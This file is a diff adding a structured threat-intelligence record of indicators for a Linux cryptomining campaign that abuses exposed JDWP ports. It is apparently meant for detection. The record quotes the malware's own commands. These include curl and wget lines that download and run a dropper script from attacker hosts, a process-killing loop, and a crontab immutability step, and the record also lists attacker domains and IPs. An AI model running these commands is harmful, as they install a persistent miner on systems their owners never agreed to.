@@ -1,0 +1,306 @@
+{
+  "malware_family": "JDWP-Miner",
+  "threat_actor": "Unknown",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "An attack exploiting exposed Java Debug Wire Protocol (JDWP) ports to achieve remote code execution on Linux systems. A dropper script (logservice.sh) is used to deploy a custom-configured XMRig miner, which masquerades as the 'logrotate' utility. Persistence is established through numerous methods including cron jobs, systemd services, and shell startup files.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "curl -o /tmp/logservice.sh -s https://canonicalconnect.com/logservice.sh",
+      "context": "Initial command executed via JDWP to download the dropper script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "bash /tmp/logservice.sh",
+      "context": "Command executed via JDWP to run the dropper script.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "logservice.sh",
+      "context": "Name of the initial dropper script.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.config/logrotate",
+      "context": "Path where the XMRig miner payload is dropped.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "logrotate",
+      "context": "Masquerading filename for the custom XMRig miner.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ps -eo pid,%cpu,comm --sort=-%cpu | awk 'NR>1 && !/awk|ps/ && !($3 ~ /^(logrotate|sshd|java)$/) && int($2) > 60 { system(\"kill -9 \" $1) }'",
+      "context": "Command from dropper script to kill competing high-CPU processes.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "source <(wget -q -O - http://185.196.8.123/logservice.sh || curl -sL http://185.196.8.123/logservice.sh>)",
+      "context": "Persistence command written to cron jobs and shell startup files.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "logrotate.service",
+      "context": "Name of the malicious systemd service for persistence.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/systemd/system/logrotate.service",
+      "context": "Path of the malicious systemd service file.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "The logrotate utility is designed to simplify the administration of log files on a system which generates a lot of log files",
+      "context": "Description string in the malicious logrotate.service unit file.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.bash_logout",
+      "context": "Shell file modified for persistence on logout.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.zshrc",
+      "context": "Shell file modified for persistence on login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/cron.hourly/logrotate",
+      "context": "Path for hourly persistence cron script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/cron.daily/logrotate",
+      "context": "Path for daily persistence cron script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sudo chattr +i /etc/crontab",
+      "context": "Command to make the system crontab file immutable after modification.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "java.lang.Runtime.exec",
+      "context": "Java method invoked via JDWP for remote code execution.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "jdwp-shellifier",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "other",
+      "value": "JDWP-Handshake",
+      "context": "Initial string sent to probe for open JDWP interfaces.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "canonicalconnect.com",
+      "context": "Payloads file server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "awarmcorner.world",
+      "context": "Payloads file server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://awarmcorner.world/silicon64blueprints.png",
+      "context": "XMRig payload URL for x86_64 architecture.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://awarmcorner.world/siliconarmblueprints.png",
+      "context": "XMRig payload URL for aarch64 architecture.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://awarmcorner.world/siliconarmv7blueprints.png",
+      "context": "XMRig payload URL for armv7l architecture.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.196.8.123",
+      "context": "File server hosting logservice.sh dropper.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.196.8.86",
+      "context": "Payloads file server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "176.65.148.57",
+      "context": "Source of JDWP scanning activity.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "176.65.148.86",
+      "context": "Source of JDWP scanning activity.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "176.65.148.239",
+      "context": "Source of JDWP scanning activity.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.208.156.247:3333",
+      "context": "Cryptocurrency mining pool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.196.8.41",
+      "context": "Cryptocurrency mining pool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "aheatcorner.world",
+      "context": "Previous payloads file server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cozy.yachts",
+      "context": "Previous payloads file server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://s3.tebi.io/dhcpdc/o.sh",
+      "context": "URL for a related attack script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "script",
+    "elf"
+  ]
+}
